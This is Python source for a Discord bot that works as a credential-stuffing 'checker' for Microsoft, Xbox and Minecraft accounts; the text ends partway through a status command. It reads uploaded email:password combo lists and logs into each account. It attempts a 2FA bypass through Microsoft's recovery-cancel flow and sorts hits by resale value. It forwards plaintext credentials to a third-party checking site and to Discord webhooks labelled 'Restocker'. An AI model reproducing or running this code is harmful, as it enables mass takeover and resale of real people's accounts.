import discord
from discord.ext import commands
import asyncio
import configparser
import json
import os
from datetime import datetime, timezone
import time
import traceback
from pathlib import Path
import sys
import requests
import uuid
import logging
import re
import warnings
import urllib3
from urllib.parse import urlparse, parse_qs
from io import StringIO, BytesIO
import threading
import random
import socket
import concurrent.futures

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    MINECRAFT_NETWORKING_AVAILABLE = True
except ImportError as e:
    logging.warning(f"minecraft.networking not available: {e}")
    MINECRAFT_NETWORKING_AVAILABLE = False

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

XBOX_LOGIN_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
DONUTSMP_API_KEY = "1a5487cf06ef44c982dfb92c3a8ba0eb"

BOT_OWNER_ID = 1383641747913183256

config_dir = Path("config/paidchecker4")
config_dir.mkdir(parents=True, exist_ok=True)

config_file = config_dir / "config.ini"
authdb_file = config_dir / "authdb.json"

if not config_file.exists():
    config = configparser.ConfigParser()
    config['SETTINGS'] = {
        'bot_token': 'YOUR_BOT_TOKEN_HERE',
        'log_channel_id': 'YOUR_LOG_CHANNEL_ID_HERE',
        'Webhook': 'paste your discord webhook here',
        'BannedWebhook': 'paste banned accounts webhook',
        'UnbannedWebhook': 'paste unbanned accounts webhook'
    }
    with open(config_file, 'w') as f:
        config.write(f)

config = configparser.ConfigParser()
config.read(config_file)

BOT_TOKEN = config['SETTINGS']['bot_token']
LOG_CHANNEL_ID = int(config['SETTINGS']['log_channel_id']) if config['SETTINGS']['log_channel_id'].isdigit() else None
WEBHOOK_URL = config['SETTINGS'].get('Webhook', '')
BANNED_WEBHOOK_URL = config['SETTINGS'].get('BannedWebhook', '')
UNBANNED_WEBHOOK_URL = config['SETTINGS'].get('UnbannedWebhook', '')

if not authdb_file.exists():
    with open(authdb_file, 'w') as f:
        json.dump([], f)

def load_authed_users():
    with open(authdb_file, 'r') as f:
        return json.load(f)

def save_authed_users(users):
    with open(authdb_file, 'w') as f:
        json.dump(users, f, indent=2)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='$', intents=intents)

start_time = time.time()
checking_status = {}
executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)

class CheckerSession:
    def __init__(self, user_id, combos, threads=1):
        self.user_id = user_id
        self.combos = combos
        self.threads = 1
        self.total = len(combos)
        self.checked = 0
        self.valid = []
        self.invalid = []
        self.hits = []
        self.valid_mails = []
        self.xboxgamepass = []
        self.xboxgamepassultimate = []
        self.running = True
        self.start_time = time.time()
        self.banned_accounts = []
        self.unbanned_accounts = []
        self.errors = 0
        self.sfa_accounts = []
        self.mfa_accounts = []
        self.two_fa_accounts = []
        self.retries = 0
        self.capes_accounts = []
        self.normal_accounts = []
        self.capture_accounts = []
        self.namechangeable_accounts = []
        self.summary_sent = False
        self.bedrock_accounts = []
        self.legends_accounts = []
        self.dungeons_accounts = []

    def check_email_access_sync(self, email, password):
        try:
            r = requests.get(f"https://email.avine.tools/check?email={email}&password={password}", timeout=10, verify=False)
            data = r.json()
            if data.get("Success") == 1:
                logging.info(f"✅ Email access: MFA enabled")
                return "MFA"
            else:
                logging.info(f"✅ Email access: SFA only")
                return "SFA"
        except:
            return "Unknown"

    def check_hypixel_stats_sync(self, username):
        try:
            r = requests.get(f'https://plancke.io/hypixel/player/stats/{username}', timeout=10, verify=False, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
            if r.status_code == 200:
                text = r.text
                stats = {}
                try:
                    level_match = re.search(r'(?<=Level:</b> ).+?(?=<br/><b>)', text)
                    if level_match:
                        stats['level'] = level_match.group()
                except:
                    pass
                try:
                    first_match = re.search(r'(?<=<b>First login: </b>).+?(?=<br/><b>)', text)
                    if first_match:
                        stats['first_login'] = first_match.group()
                except:
                    pass
                try:
                    last_match = re.search(r'(?<=<b>Last login: </b>).+?(?=<br/>)', text)
                    if last_match:
                        stats['last_login'] = last_match.group()
                except:
                    pass
                try:
                    bw_match = re.search(r'(?<=<li><b>Level:</b> ).+?(?=</li>)', text)
                    if bw_match:
                        stats['bw_stars'] = bw_match.group()
                except:
                    pass
                if stats:
                    logging.info(f"✅ Hypixel stats: {stats}")
                return stats
        except:
            pass
        return {}

    def check_optifine_cape_sync(self, username):
        try:
            r = requests.get(f'http://s.optifine.net/capes/{username}.png', timeout=10, verify=False)
            has_cape = "No" if "Not found" in r.text else "Yes"
            logging.info(f"✅ Optifine cape: {has_cape}")
            return has_cape
        except:
            return "Unknown"

    def check_name_change_sync(self, access_token):
        try:
            r = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {access_token}'}, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                can_change = str(data.get('nameChangeAllowed', 'N/A'))
                logging.info(f"✅ Name change: {can_change}")
                return can_change
        except:
            pass
        return "Unknown"

    def check_ban_status_hypixel_sync(self, username, token, uuid_val):
        if not MINECRAFT_NETWORKING_AVAILABLE:
            logging.info(f"ℹ️ minecraft.networking unavailable for {username}")
            return "False"

        ban_status = None
        tries = 0

        while tries < 3:
            try:
                logging.info(f"🔄 Ban check for {username} (try {tries+1}/3)")
                auth_token = AuthenticationToken(username=username, access_token=token, client_token=uuid.uuid4().hex)
                auth_token.profile = Profile(id_=uuid_val, name=username)
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})

                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    nonlocal ban_status
                    try:
                        data = json.loads(str(packet.json_data))
                        raw_text = str(data)

                        if "The Hypixel Alpha server is currently closed!" in raw_text:
                            ban_status = "False"
                            return
                        if "Failed cloning your SkyBlock data" in raw_text:
                            ban_status = "False"
                            return

                        if "Suspicious activity" in raw_text:
                            try:
                                ban_id = data['extra'][6]['text'].strip() if 'extra' in data and len(data['extra']) > 6 else "Unknown"
                                ban_status = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                                logging.info(f"🚫 {username} - Suspicious activity ban")
                            except:
                                ban_status = "[Permanently] Suspicious activity detected"
                                logging.info(f"🚫 {username} - Suspicious activity ban")
                        elif "temporarily banned" in raw_text:
                            try:
                                duration = data['extra'][1]['text'] if 'extra' in data and len(data['extra']) > 1 else "Unknown"
                                reason = data['extra'][4]['text'].strip() if 'extra' in data and len(data['extra']) > 4 else "Unknown"
                                ban_id = data['extra'][8]['text'].strip() if 'extra' in data and len(data['extra']) > 8 else "Unknown"
                                ban_status = f"[{duration}] {reason} Ban ID: {ban_id}"
                                logging.info(f"⏰ {username} - Temporarily banned")
                            except:
                                ban_status = "[Temporarily] Banned"
                                logging.info(f"⏰ {username} - Temporarily banned")
                        elif "You are permanently banned from this server!" in raw_text:
                            try:
                                reason = data['extra'][2]['text'].strip() if 'extra' in data and len(data['extra']) > 2 else "Unknown"
                                ban_id = data['extra'][6]['text'].strip() if 'extra' in data and len(data['extra']) > 6 else "Unknown"
                                ban_status = f"[Permanently] {reason} Ban ID: {ban_id}"
                                logging.info(f"🚫 {username} - Permanently banned")
                            except:
                                ban_status = "[Permanently] Banned"
                                logging.info(f"🚫 {username} - Permanently banned")
                        else:
                            try:
                                if 'extra' in data:
                                    ban_status = ''.join(item.get("text", "") if isinstance(item, dict) else str(item) for item in data["extra"])
                                    logging.info(f"⚠️ {username} - Other disconnect: {ban_status[:50]}")
                                else:
                                    ban_status = "False"
                                    logging.info(f"✅ {username} - Not banned (server closed)")
                            except:
                                ban_status = "False"
                    except:
                        ban_status = "False"

                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    nonlocal ban_status
                    if ban_status is None:
                        ban_status = "False"
                        logging.info(f"✅ {username} - Joined successfully (not banned)")

                try:
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try:
                        connection.connect()
                        c = 0
                        while ban_status is None and c < 1000:
                            time.sleep(0.01)
                            c += 1
                        connection.disconnect()
                    except:
                        pass
                    sys.stderr = original_stderr
                except:
                    pass

                if ban_status is not None:
                    break
                tries += 1
            except Exception as e:
                logging.debug(f"Ban check error for {username}: {str(e)}")
                tries += 1

        if ban_status is None:
            logging.info(f"ℹ️ {username} - Ban check failed, defaulting to False")
            ban_status = "False"

        return ban_status

    def get_urlPost_sFTTag_sync(self, session):
        maxretries = 15
        tries = 0

        while tries < maxretries:
            try:
                logging.info(f"🔄 Fetching Xbox login page (try {tries+1}/{maxretries})...")
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}
                r = session.get(XBOX_LOGIN_URL, timeout=15, verify=False, headers=headers)
                text = r.text
                logging.info(f"✅ Got response, status: {r.status_code}, length: {len(text)}")

                match = re.search(r'value=\\"(.+?)\\"', text, re.S)
                if match is None:
                    match = re.search(r'value="(.+?)"', text, re.S)

                if match is not None:
                    sFTTag = match.group(1)
                    logging.info(f"✅ Found sFTTag: {sFTTag[:80]}...")
                    match = re.search(r'"urlPost":"([^"]+)"', text, re.S)
                    if match is None:
                        match = re.search(r"urlPost:'(.+?)'", text, re.S)
                    if match is not None:
                        logging.info(f"✅ Found urlPost on try {tries+1}")
                        return match.group(1), sFTTag, session
                    else:
                        logging.warning(f"⚠️ Could not find urlPost on try {tries+1}")
                else:
                    logging.warning(f"⚠️ Could not find sFTTag on try {tries+1}")

                tries += 1
                if tries < maxretries:
                    logging.info(f"Retrying... ({tries}/{maxretries})")
                time.sleep(1)
            except Exception as e:
                logging.info(f"ℹ️ Failed to get login page: {str(e)}")
                tries += 1
                if tries < maxretries:
                    logging.info(f"Retrying... ({tries}/{maxretries})")
                time.sleep(1)

        logging.info(f"ℹ️ Failed to get login page after {maxretries} tries")
        return None, None, session

    def get_xbox_rps_sync(self, session, email, password, urlPost, sFTTag, maxretries=1):
        tries = 0
        while tries < maxretries:
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
                login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15, verify=False)

                if '#' in login_request.url and login_request.url != XBOX_LOGIN_URL:
                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        logging.info(f"✅ Xbox token obtained for {email}")
                        return token, session, "valid"

                elif 'cancel?mkt=' in login_request.text:
                    logging.info(f"ℹ️ 2FA challenge for {email}")
                    try:
                        ipt_match = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text)
                        pprid_match = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text)
                        uaid_match = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text)

                        if not (ipt_match and pprid_match and uaid_match):
                            logging.info(f"ℹ️ 2FA form fields missing for {email}")
                            return "None", session, "2fa"

                        data = {'ipt': ipt_match.group(), 'pprid': pprid_match.group(), 'uaid': uaid_match.group()}
                        action_match = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text)
                        if not action_match:
                            logging.info(f"ℹ️ 2FA form action missing for {email}")
                            return "None", session, "2fa"

                        ret = session.post(action_match.group(), data=data, allow_redirects=True, timeout=15, verify=False)
                        recovery_match = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text)
                        if not recovery_match:
                            logging.info(f"ℹ️ Recovery URL missing for {email}")
                            return "None", session, "2fa"

                        fin = session.get(recovery_match.group(), allow_redirects=True, timeout=15, verify=False)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                        if token != "None":
                            logging.info(f"✅ 2FA bypass for {email}")
                            return token, session, "valid"
                    except Exception as e2:
                        logging.info(f"ℹ️ 2FA bypass attempt for {email}: {str(e2)}")
                    return "None", session, "2fa"

                elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                    logging.info(f"ℹ️ 2FA required for {email}")
                    return "None", session, "2fa"

                elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times"]):
                    logging.info(f"ℹ️ Bad credentials for {email}")
                    return "None", session, "bad"

                else:
                    logging.warning(f"⚠️ Unrecognized response, retry {tries+1}/{maxretries} for {email}")
                    tries += 1
                    self.retries += 1
            except Exception as e:
                logging.info(f"ℹ️ Xbox RPS error for {email}: {str(e)} - Try {tries+1}/{maxretries}")
                tries += 1
                self.retries += 1

        logging.info(f"ℹ️ Failed to get Xbox token for {email} after {maxretries} tries")
        return "None", session, "bad"

    def get_xbox_token_sync(self, session, rps_token):
        try:
            data = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rps_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            r = session.post('https://user.auth.xboxlive.com/user/authenticate', json=data, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15, verify=False)
            if r.status_code == 200:
                js = r.json()
                return js.get('Token'), js['DisplayClaims']['xui'][0]['uhs']
        except:
            pass
        return None, None

    def get_xsts_token_sync(self, session, xbox_token):
        try:
            data = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
            r = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=data, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15, verify=False)
            if r.status_code == 200:
                return r.json().get('Token')
        except:
            pass
        return None

    def get_mc_token_sync(self, session, uhs, xsts_token, maxretries=3):
        tries = 0
        while tries < maxretries:
            try:
                r = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15, verify=False)
                if r.status_code == 429:
                    logging.info(f"ℹ️ Rate limited (429), retry {tries+1}/{maxretries}")
                    tries += 1
                    continue
                elif r.status_code == 200:
                    token = r.json().get('access_token')
                    if token:
                        logging.info(f"✅ MC token obtained")
                        return token
                    logging.info(f"ℹ️ No access token in response: {r.status_code}")
                else:
                    logging.info(f"ℹ️ MC login failed: HTTP {r.status_code}")
                tries += 1
            except Exception as e:
                logging.info(f"ℹ️ MC token error: {str(e)} - Try {tries+1}/{maxretries}")
                tries += 1
        logging.info(f"ℹ️ Failed to get MC token after {maxretries} tries")
        return None

    def check_mc_entitlements_sync(self, session, mc_token, email="unknown"):
        tries = 0
        maxretries = 3
        while tries < maxretries:
            try:
                r = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10, verify=False)
                if r.status_code == 429:
                    logging.warning(f"⚠️ Rate limited (429), retry {tries+1}/{maxretries}")
                    tries += 1
                    time.sleep(1)
                    continue
                elif r.status_code == 200:
                    text = r.text

                    minecraft_games = []
                    has_java = '"product_minecraft"' in text
                    has_bedrock = 'product_minecraft_bedrock' in text
                    has_legends = 'product_legends' in text
                    has_dungeons = 'product_dungeons' in text

                    if has_bedrock:
                        minecraft_games.append("Minecraft Bedrock")
                    if has_legends:
                        minecraft_games.append("Minecraft Legends")
                    if has_dungeons:
                        minecraft_games.append("Minecraft Dungeons")

                    mc_games_str = ",".join(minecraft_games) if minecraft_games else ""

                    if 'product_game_pass_ultimate' in text:
                        logging.info(f"✅ VALID: {email} - Xbox Game Pass Ultimate")
                        return ("xgpu", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    elif 'product_game_pass_pc' in text:
                        logging.info(f"✅ VALID: {email} - Xbox Game Pass")
                        return ("xgp", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    elif has_java:
                        logging.info(f"✅ VALID: {email} - Normal")
                        return ("normal", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    elif minecraft_games:
                        logging.info(f"✅ VALID: {email} - Minecraft Games: {', '.join(minecraft_games)}")
                        return ("minecraft_other", mc_games_str, has_java, has_bedrock, has_legends, has_dungeons)
                    else:
                        logging.info(f"✅ VALID MAIL: {email} - Microsoft account only")
                        return ("validmail", "", False, False, False, False)
                else:
                    logging.error(f"❌ Entitlements HTTP {r.status_code} for {email}")
                tries += 1
            except Exception as e:
                logging.error(f"❌ Entitlements check error: {str(e)} - Try {tries+1}/{maxretries}")
                tries += 1
                time.sleep(1)
        return (None, "", False, False, False, False)

    def get_mc_profile_sync(self, session, mc_token):
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10, verify=False)
            if r.status_code == 200:
                data = r.json()
                capes = ", ".join([cape["alias"] for cape in data.get("capes", [])])
                return data.get('name', 'N/A'), data.get('id', 'N/A'), capes if capes else "None"
        except:
            pass
        return None, None, None

    def check_single_account_sync(self, combo):
        try:
            if ':' not in combo:
                return

            parts = combo.strip().split(':')
            if len(parts) < 2:
                return

            email = parts[0]
            password = ':'.join(parts[1:])

            session = requests.Session()
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

            urlPost, sFTTag, session = self.get_urlPost_sFTTag_sync(session)
            if not urlPost or not sFTTag:
                self.errors += 1
                self.checked += 1
                return

            rps_token, session, status = self.get_xbox_rps_sync(session, email, password, urlPost, sFTTag)

            if status == "2fa":
                self.two_fa_accounts.append(f"{email}:{password}")
                self.checked += 1
                return

            if status == "bad" or rps_token == "None":
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                return

            xbox_token, uhs = self.get_xbox_token_sync(session, rps_token)
            if not xbox_token:
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                return

            xsts_token = self.get_xsts_token_sync(session, xbox_token)
            if not xsts_token:
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                return

            mc_token = self.get_mc_token_sync(session, uhs, xsts_token)
            if not mc_token:
                self.invalid.append(f"{email}:{password}")
                self.checked += 1
                return

            entitlement, mc_games_str, has_java, has_bedrock, has_legends, has_dungeons = self.check_mc_entitlements_sync(session, mc_token, email)

            if entitlement == "validmail":
                self.valid_mails.append(f"{email}:{password}")
                self.checked += 1
                return

            if not entitlement:
                self.valid_mails.append(f"{email}:{password}")
                self.checked += 1
                return

            username, uuid_val, capes = self.get_mc_profile_sync(session, mc_token)

            if not username:
                username = "N/A"
                uuid_val = "N/A"
                capes = "None"

            email_access = self.check_email_access_sync(email, password)
            if email_access == "MFA":
                self.mfa_accounts.append(f"{email}:{password}")
            elif email_access == "SFA":
                self.sfa_accounts.append(f"{email}:{password}")

            can_change_name = "Unknown"
            hypixel_stats = {}
            optifine_cape = "Unknown"
            ban_status = "False"

            if username != "N/A":
                can_change_name = self.check_name_change_sync(mc_token)
                hypixel_stats = self.check_hypixel_stats_sync(username)
                optifine_cape = self.check_optifine_cape_sync(username)
                ban_status = self.check_ban_status_hypixel_sync(username, mc_token, uuid_val)

            if can_change_name == "True":
                self.namechangeable_accounts.append(f"{email}:{password} | {username}")

            if capes and capes != "None":
                self.capes_accounts.append(f"{email}:{password} | {username} | Capes: {capes}")

            if entitlement == "xgpu":
                account_type = "Xbox Game Pass Ultimate"
            elif entitlement == "xgp":
                account_type = "Xbox Game Pass"
            elif entitlement == "normal":
                account_type = "Normal"
            elif entitlement == "minecraft_other":
                account_type = f"Minecraft Games ({mc_games_str})"
            else:
                account_type = "Unknown"

            capture_line = f"{email}:{password} | {username} | {account_type} | Hypixel Ban: {ban_status} | Current Username: {username} | NameChangeable: {can_change_name}"

            if str(ban_status).lower() == "false":
                self.unbanned_accounts.append(capture_line)
            else:
                self.banned_accounts.append(capture_line)

            if entitlement == "xgpu":
                self.xboxgamepassultimate.append(capture_line)
            elif entitlement == "xgp":
                self.xboxgamepass.append(capture_line)
            elif entitlement == "normal":
                self.normal_accounts.append(f"{email}:{password}")

            if has_bedrock:
                self.bedrock_accounts.append(f"{email}:{password} | {username}")
            if has_legends:
                self.legends_accounts.append(f"{email}:{password} | {username}")
            if has_dungeons:
                self.dungeons_accounts.append(f"{email}:{password} | {username}")

            has_java_access = has_java or entitlement in ["xgpu", "xgp", "normal"]

            if has_java_access:
                self.valid.append({'email': email, 'password': password, 'username': username, 'type': entitlement, 'mc_games': mc_games_str, 'has_java': has_java, 'has_bedrock': has_bedrock, 'has_legends': has_legends, 'has_dungeons': has_dungeons})
                self.hits.append(capture_line)

                capture_entry = f"Email: {email}\nPassword: {password}\nName: {username}\nCapes: {capes}\nAccount Type: {account_type}\nEmail Access: {email_access}\nBanned: {ban_status}\nCan Change Name: {can_change_name}"
                if mc_games_str:
                    capture_entry += f"\nMinecraft Games: {mc_games_str}"
                if hypixel_stats.get('level'):
                    capture_entry += f"\nHypixel Level: {hypixel_stats['level']}"
                if hypixel_stats.get('bw_stars'):
                    capture_entry += f"\nBedwars Stars: {hypixel_stats['bw_stars']}"
                capture_entry += f"\nOptifine Cape: {optifine_cape}"
                capture_entry += "\n============================"
                self.capture_accounts.append(capture_entry)

                self.send_to_webhook_sync({
                    'email': email,
                    'password': password,
                    'username': username,
                    'uuid': uuid_val,
                    'banned': ban_status,
                    'capes': capes,
                    'type': account_type,
                    'can_change_name': can_change_name,
                    'email_access': email_access,
                    'optifine_cape': optifine_cape,
                    'hypixel_level': hypixel_stats.get('level', 'N/A'),
                    'bw_stars': hypixel_stats.get('bw_stars', 'N/A'),
                    'mc_games': mc_games_str,
                    'has_java': has_java
                })

            self.checked += 1

        except Exception as e:
            self.errors += 1
            self.checked += 1

    def send_to_webhook_sync(self, account):
        try:
            email = account.get('email', 'N/A')
            password = account.get('password', 'N/A')
            username = account.get('username', 'N/A')
            banned = account.get('banned', 'Unknown')
            capes = account.get('capes', 'None')
            account_type = account.get('type', 'Normal')
            can_change_name = account.get('can_change_name', 'N/A')
            email_access = account.get('email_access', 'Unknown')
            optifine_cape = account.get('optifine_cape', 'Unknown')
            hypixel_level = account.get('hypixel_level', 'N/A')
            bw_stars = account.get('bw_stars', 'N/A')
            mc_games = account.get('mc_games', '')

            webhook_url = None
            
            if str(banned).lower() == "false":
                webhook_url = UNBANNED_WEBHOOK_URL
            else:
                webhook_url = BANNED_WEBHOOK_URL

            if not webhook_url or 'paste' in webhook_url.lower():
                return

            custom_image_url = "https://cdn.discordapp.com/attachments/1439671166007775312/1441536474578423838/IMG_5098.png"

            fields = [
                {"name": "📧 Email", "value": f"||{email}||", "inline": True},
                {"name": "🔑 Password", "value": f"||{password}||", "inline": True},
                {"name": "⛔ Banned", "value": f"{banned}", "inline": True},
                {"name": "🎮 Hypixel Name", "value": username, "inline": True},
                {"name": "🔄 Can Change Name", "value": str(can_change_name), "inline": True},
                {"name": "📊 Hypixel Level", "value": str(hypixel_level), "inline": True},
                {"name": "🦸 Capes", "value": f"{capes} | Optifine: {optifine_cape}", "inline": True},
                {"name": "🎯 Account Type", "value": account_type, "inline": True},
                {"name": "🛡️ Combo", "value": f"||{email}:{password}||", "inline": True},
            ]

            payload = {
                "username": "Ice Cloud Restocker",
                "avatar_url": custom_image_url,
                "embeds": [{
                    "author": {
                        "name": "Ice Cloud Restocker",
                        "icon_url": custom_image_url
                    },
                    "title": username if username != "N/A" else email,
                    "color": 65535,
                    "fields": fields,
                    "thumbnail": {"url": f"https://visage.surgeplay.com/bust/{username}?y=-40&quality=lossless" if username != "N/A" else custom_image_url},
                    "footer": {"text": "Auto Restocker By SeriesV2 ⭐", "icon_url": custom_image_url}
                }]
            }

            requests.post(webhook_url, json=payload, timeout=10, verify=False)
        except Exception as e:
            logging.error(f"Error sending to webhook: {e}")

    async def run_check(self):
        loop = asyncio.get_event_loop()
        batch_size = 2

        for i in range(0, len(self.combos), batch_size):
            if not self.running:
                break

            batch = self.combos[i:i + batch_size]
            tasks = [loop.run_in_executor(executor, self.check_single_account_sync, combo) for combo in batch if self.running]

            if tasks:
                await asyncio.gather(*tasks)

            await asyncio.sleep(0.05)

        if self.running:
            self.running = False
            await send_completion_summary(self)

            if self.user_id in checking_status:
                del checking_status[self.user_id]

async def send_completion_summary(session):
    try:
        if session.summary_sent:
            return

        session.summary_sent = True

        if not LOG_CHANNEL_ID:
            return

        log_channel = bot.get_channel(LOG_CHANNEL_ID)
        if not log_channel:
            return

        embed = discord.Embed(
            title="🏢 Current Checker Status",
            color=0x00FFFF
        )

        embed.add_field(name="📁 Total/Checked", value=f"{session.checked}/{session.total}", inline=False)
        embed.add_field(name="✅ Hits", value=str(len(session.hits)), inline=False)
        embed.add_field(name="❌ Bad", value=str(len(session.invalid)), inline=False)
        embed.add_field(name="🔒 MFA", value=str(len(session.mfa_accounts)), inline=False)
        embed.add_field(name="🔐 2FA", value=str(len(session.two_fa_accounts)), inline=False)
        embed.add_field(name="🔒 SFA", value=str(len(session.sfa_accounts)), inline=False)
        embed.add_field(name="🎮 Xbox Gamepass", value=str(len(session.xboxgamepass)), inline=False)
        embed.add_field(name="⭐ Xbox Gamepass Ultimate", value=str(len(session.xboxgamepassultimate)), inline=False)
        embed.add_field(name="🎲 Bedrock", value=str(len(session.bedrock_accounts)), inline=False)
        embed.add_field(name="⚔️ Legends", value=str(len(session.legends_accounts)), inline=False)
        embed.add_field(name="🏰 Dungeons", value=str(len(session.dungeons_accounts)), inline=False)
        embed.add_field(name="📩 Valid Mail", value=str(len(session.valid_mails)), inline=False)
        embed.add_field(name="🔄 Retries", value=str(session.retries), inline=False)
        embed.add_field(name="⚠️ Errors", value=str(session.errors), inline=False)
        embed.set_footer(text="Auto Restocker By SeriesV2 ⭐")


        await log_channel.send(embed=embed)

        files_to_upload = [
            ("2FA.txt", session.two_fa_accounts),
            ("SFA.txt", session.sfa_accounts),
            ("MFA.txt", session.mfa_accounts),
            ("Normal.txt", session.normal_accounts),
            ("Bedrock.txt", session.bedrock_accounts),
            ("Legends.txt", session.legends_accounts),
            ("Dungeons.txt", session.dungeons_accounts),
            ("Capes.txt", session.capes_accounts),
            ("Capture.txt", session.capture_accounts),
            ("Hits.txt", session.hits),
            ("Unbanned.txt", session.unbanned_accounts),
            ("Banned.txt", session.banned_accounts),
            ("Xboxgamepass.txt", session.xboxgamepass),
            ("Xboxgamepassultimate.txt", session.xboxgamepassultimate),
            ("Validmail.txt", session.valid_mails),
            ("Namechangeable.txt", session.namechangeable_accounts),
        ]

        for filename, data_list in files_to_upload:
            if data_list:
                content = '\n'.join(data_list)
                file_bytes = BytesIO(content.encode('utf-8'))
                await log_channel.send(f"📤 Uploading result file: **{filename}**", file=discord.File(file_bytes, filename))

        await log_channel.send(embed=discord.Embed(title="Checker Complete", description="All results sent.", color=0x00FF00))

    except Exception as e:
        logging.error(f"Error sending summary: {e}")

def update_config(key, value):
    config.read(config_file)
    config['SETTINGS'][key] = str(value)
    with open(config_file, 'w') as f:
        config.write(f)

@bot.event
async def on_ready():
    print(f'Bot logged in as {bot.user}')

@bot.event
async def on_member_join(member):
    try:
        unauthorized_role = discord.utils.get(member.guild.roles, name="Unauthorized Users")
        if unauthorized_role:
            await member.add_roles(unauthorized_role)
    except:
        pass

@bot.command()
async def check(ctx):
    authed_users = load_authed_users()
    if ctx.author.id not in authed_users:
        embed = discord.Embed(title="Not Authorized", description=f"{ctx.author.mention} You are not authorized.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    if not ctx.message.attachments:
        embed = discord.Embed(title="No Attachment", description="Please attach a .txt file with combo list", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith('.txt'):
        embed = discord.Embed(title="Invalid File Type", description="Please attach a .txt file", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    if checking_status:
        active_user_id = list(checking_status.keys())[0]
        active_user = bot.get_user(active_user_id)
        embed = discord.Embed(title="Check Already Running", description=f"A check is running by {active_user.mention if active_user else 'another user'}. Use $stop first.", color=0x00FFFF)
        await ctx.send(embed=embed)
        return

    content = await attachment.read()
    combos = content.decode('utf-8').splitlines()

    session = CheckerSession(ctx.author.id, combos)
    checking_status[ctx.author.id] = session

    embed = discord.Embed(title="Check Started", description=f"Checking **{len(combos):,}** accounts...", color=0x00FFFF)
    await ctx.send(embed=embed)

    asyncio.create_task(session.run_check())

@bot.command()
async def cui(ctx):
    authed_users = load_authed_users()
    if ctx.author.id not in authed_users:
        embed = discord.Embed(
            title="❌ Not Authorized",
            description=f"{ctx.author.mention} You are not authorized to use this command.",
            color=0x00FFFF,
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="Ice Cloud ・ Authorization Required")
        await ctx.send(embed=embed)
        return

    if not checking_status:
        embed = discord.Embed(
            title="🏢 Current Checker Status",
            color=0x00FFFF
        )
        embed.add_field(name="📁 Total/Checked", value="0/0", inline=False)
        embed.add_field(name="✅ Hits", value="0", inline=False)
        embed.add_field(name="❌ Bad", value="0", inline=False)
        embed.add_field(name="🔒 MFA", value="0", inline=False)
        embed.add_field(name="🔐 2FA", value="0", inline=False)
        embed.add_field(name="🔒 SFA", value="0", inline=False)
        embed.add_field(name="🎮 Xbox Gamepass", value="0", inline=False)
        embed.add_field(name="⭐ Xbox Gamepass Ultimate", value="0", inline=False)
        embed.add_field(name="🎲 Bedrock", value="0", inline=False)
        embed.add_field(name="⚔️ Legends", value="0", inline=False)
